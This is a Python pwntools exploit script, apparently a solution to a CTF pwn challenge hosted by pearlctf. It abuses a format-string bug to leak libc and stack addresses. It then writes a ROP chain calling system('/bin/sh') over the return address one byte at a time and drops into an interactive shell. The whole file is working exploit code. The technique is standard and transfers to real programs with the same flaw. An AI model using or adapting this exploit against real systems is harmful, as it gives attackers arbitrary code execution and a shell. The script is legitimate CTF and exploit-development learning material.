#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "mr---ropot.ctf.pearlctf.in", 30009

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    b *main+188
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        # attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe=elf.path)
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def onegadget():
    try:
        result = process(["one_gadget", "-r", "-l", "30", "libc.so.6"])
        output = result.recvline().decode().strip().split(" ")
        result.close()
        one_gadget = [int(addr) for addr in output]
        return one_gadget
    except Exception as e:
        print(f"Error running one_gadget: {e}")
        return []

def exploit():
    global io
    #   one_gadget = onegadget()
    io = initialize()
    with log.progress("Leaking addresses"), context.silent:
        io.sendlineafter("3. Exit\n", "1")
        io.sendlineafter("I take something for it.\n", "%1$p.%9$p")
        io.recvuntil("Your Response:\n")
        leak = io.recvline().strip().split(b".")
        libc_leak = int(leak[0],16)
        libc.address = libc_leak - (libc.sym["_IO_2_1_stdout_"] + 131)
        stack_leak = int(leak[1],16)
        ret = stack_leak - 0x120
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    log.info("Stack leak: %#x", stack_leak)
    log.info("Return address: %#x", ret)
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search(b"/bin/sh\x00")))
    payload = rop.chain()
    with log.progress("Sending payload"), context.silent:
        for i in range(len(payload)):
            writes = {ret+i:payload[i]}
            io.sendlineafter("has been recorded.\n", "1")
            io.sendlineafter("Leave a response: \n", fmtstr_payload(6, writes, write_size='byte'))
    io.sendlineafter("has been recorded.\n", "3")
    io.interactive()

if __name__ == '__main__':
    exploit()
